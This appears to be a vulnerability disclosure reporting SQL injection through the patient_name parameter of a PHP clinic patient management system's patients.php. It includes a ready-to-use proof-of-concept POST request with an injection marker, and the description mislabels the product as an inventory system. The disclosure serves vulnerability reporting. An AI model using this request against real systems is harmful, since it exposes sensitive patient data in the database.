## The clinic patient management system has SQL injection vulnerability
## supplier
https://www.sourcecodester.com/php-clinics-patient-management-system-source-code
## Vulnerability file
/pms/patients.php
## describe
Unrestricted SQL injection attacks exist in the inventory management system. The parameters that can be controlled are as follows:  patient_name  This function executes the patient_name parameter into an SQL statement without any restrictions. Malicious attackers can use this vulnerability to obtain sensitive information in the server database
## code analysis
The patient_name parameter in patients.php is controlled and is directly carried into the SQL statement for execution, resulting in SQL injection
<img width="1150" alt="image" src="https://github.com/user-attachments/assets/86ac68b9-5459-4239-94f7-098e0feb6544">


Injection via the patient_name parameter
POC
```
POST /pms/patients.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 107
Origin: http://localhost
Connection: close
Referer: http://localhost/pms/patients.php
Cookie: PHPSESSID=cims89c5nt143re39d3ce6cdvd; __insuarance__logged=1; __insuarance__key=SK9MGL4R5CQPM34FZSH3
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

patient_name=22*&address=22&cnic=22&date_of_birth=08%2F02%2F2024&phone_number=22&gender=Male&save_Patient=
```

<img width="970" alt="image" src="https://github.com/user-attachments/assets/126ff8b1-bc83-412c-bf51-4ed195b4eaa2">

<img width="996" alt="image" src="https://github.com/user-attachments/assets/27749f6c-709a-4ca4-9285-40a87140f667">



